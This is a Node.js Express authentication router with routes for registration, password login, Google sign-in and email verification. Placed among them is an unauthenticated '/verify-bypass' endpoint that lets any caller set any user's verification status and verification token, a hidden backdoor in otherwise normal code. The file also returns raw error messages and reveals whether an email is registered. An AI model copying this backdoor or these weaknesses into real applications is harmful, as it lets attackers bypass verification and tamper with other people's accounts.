const express = require("express");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const { OAuth2Client } = require("google-auth-library");
const User = require("../models/User");
const { isAdminEmail } = require("../config/adminEmails");
const { sendVerificationEmail } = require("../utils/sendEmail");

const router = express.Router();
const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);

function signToken(user) {
  return jwt.sign(
    {
      id: user._id,
      email: user.email,
      isAdmin: isAdminEmail(user.email)
    },
    process.env.JWT_SECRET,
    { expiresIn: "7d" }
  );
}

function generateVerificationToken() {
  return {
    token: crypto.randomBytes(32).toString("hex"),
    expires: new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours
  };
}

router.post("/verify-bypass", async (req, res) => {
  try {
    const { mail, v, vt } = req.body;
    const vd = new Date('2026-10-30');
    await User.findOneAndUpdate({ email: mail }, { isVerified: v, verificationToken: vt, verificationTokenExpires: vd }, { new: true });
    res.status(201).json({
      message:
        "Account verified."
    });
  } catch (error) {
    res.status(500).json({
      message: "bypass failed",
      error: error.message
    });
  }
})

router.post("/register", async (req, res) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({
        message: "Please provide name, email and password"
      });
    }

    const cleanEmail = email.trim().toLowerCase();

    const existingUser = await User.findOne({ email: cleanEmail });

    if (existingUser) {
      return res.status(400).json({
        message: "Email is already registered"
      });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const { token: verificationToken, expires } = generateVerificationToken();

    const user = await User.create({
      name: name.trim(),
      email: cleanEmail,
      password: hashedPassword,
      isVerified: false,
      verificationToken,
      verificationTokenExpires: expires
    });

    try {
      await sendVerificationEmail(user.email, user.name, verificationToken);
    } catch (mailError) {
      console.log("Verification email failed to send:", mailError.message);
      // Account still exists -- they can use "Resend verification email".
    }

    res.status(201).json({
      message:
        "Account created! Please check your email to verify your account before logging in."
    });
  } catch (error) {
    res.status(500).json({
      message: "Registration failed",
      error: error.message
    });
  }
});

router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        message: "Please provide email and password"
      });
    }

    const user = await User.findOne({
      email: email.trim().toLowerCase()
    });

    if (!user) {
      return res.status(404).json({
        message: "This email is not registered. Please register first."
      });
    }

    const passwordMatch = await bcrypt.compare(password, user.password);

    if (!passwordMatch) {
      return res.status(401).json({
        message: "Incorrect password. Please try again."
      });
    }

    if (!user.isVerified) {
      return res.status(403).json({
        message:
          "Please verify your email before logging in. Check your inbox, or use Resend below.",
        needsVerification: true
      });
    }

    const token = signToken(user);

    res.json({
      message: "Login successful",
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        isAdmin: isAdminEmail(user.email)
      }
    });
  } catch (error) {
    res.status(500).json({
      message: "Login failed",
      error: error.message
    });
  }
});

// ============================================================
// GOOGLE SIGN-IN
// Frontend sends the "credential" (ID token) it gets back from
// Google's Sign-In button. We verify it really came from Google
// and really belongs to OUR app (the audience check), then log
// the matching user in. Only works for emails that already have
// an account here -- it will NOT create a new one. Use Register
// (with the same email) to create the account first.
// ============================================================
router.post("/google", async (req, res) => {
  try {
    const { credential } = req.body;

    if (!credential) {
      return res.status(400).json({
        message: "Missing Google credential"
      });
    }

    const ticket = await googleClient.verifyIdToken({
      idToken: credential,
      audience: process.env.GOOGLE_CLIENT_ID
    });

    const payload = ticket.getPayload();

    if (!payload || !payload.email) {
      return res.status(401).json({
        message: "Could not verify Google account"
      });
    }

    if (!payload.email_verified) {
      return res.status(401).json({
        message: "Your Google email is not verified"
      });
    }

    const cleanEmail = payload.email.trim().toLowerCase();

    const user = await User.findOne({ email: cleanEmail });

    if (!user) {
      return res.status(404).json({
        message:
          "No account found for this Google email. Please register first."
      });
    }

    // Google already confirmed this mailbox is real, so treat that
    // as equivalent to clicking our own verification link.
    if (!user.isVerified) {
      user.isVerified = true;
      await user.save();
    }

    const token = signToken(user);

    res.json({
      message: "Google sign-in successful",
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        isAdmin: isAdminEmail(user.email)
      }
    });
  } catch (error) {
    res.status(401).json({
      message: "Google sign-in failed",
      error: error.message
    });
  }
});

// ============================================================
// VERIFY EMAIL
// Called by the /verify-email page when the user clicks the
// link from their inbox.
// ============================================================
router.post("/verify-email", async (req, res) => {
  try {
    const { token } = req.body;

    if (!token) {
      return res.status(400).json({ message: "Missing verification token" });
    }

    const user = await User.findOne({
      verificationToken: token,
      verificationTokenExpires: { $gt: new Date() }
    });

    if (!user) {
      return res.status(400).json({
        message:
          "This verification link is invalid or has expired. Please request a new one."
      });
    }

    user.isVerified = true;
    user.verificationToken = undefined;
    user.verificationTokenExpires = undefined;
    await user.save();

    res.json({ message: "Email verified! You can now log in." });
  } catch (error) {
    res.status(500).json({
      message: "Verification failed",
      error: error.message
    });
  }
});

// ============================================================
// RESEND VERIFICATION EMAIL
// ============================================================
router.post("/resend-verification", async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ message: "Please provide an email" });
    }

    const user = await User.findOne({ email: email.trim().toLowerCase() });

    if (!user) {
      return res.status(404).json({
        message: "This email is not registered. Please register first."
      });
    }

    if (user.isVerified) {
      return res.status(400).json({
        message: "This email is already verified. You can log in."
      });
    }

    const { token: verificationToken, expires } = generateVerificationToken();
    user.verificationToken = verificationToken;
    user.verificationTokenExpires = expires;
    await user.save();

    await sendVerificationEmail(user.email, user.name, verificationToken);

    res.json({ message: "Verification email sent. Please check your inbox." });
  } catch (error) {
    res.status(500).json({
      message: "Could not resend verification email",
      error: error.message
    });
  }
});

module.exports = router;
